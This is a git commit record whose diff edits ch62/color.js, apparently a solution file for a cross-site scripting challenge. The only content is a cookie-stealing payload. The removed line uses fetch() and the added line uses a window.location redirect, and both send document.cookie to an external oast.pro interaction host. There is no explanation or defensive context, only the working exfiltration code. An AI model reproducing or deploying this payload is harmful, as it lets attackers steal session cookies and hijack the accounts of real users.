85644e7267a63fcdbfdc13ad59bb19ca445f9173
Bastian Hologne <hologne.bastian.pro@gmail.com>
2024-12-15 14:37:41 +0100

    tttt

--- ch62/color.js
+++ ch62/color.js
@@ -1,2 +1,2 @@
-fetch('https://cxdaazkz1wg0000tn4f0gqsifoyyyyyyb.oast.pro/?cookie=' + document.cookie);
+window.location.href = 'https://cxdaazkz1wg0000tn4f0gqsifoyyyyyyb.oast.pro/?cookie=' + document.cookie;
 
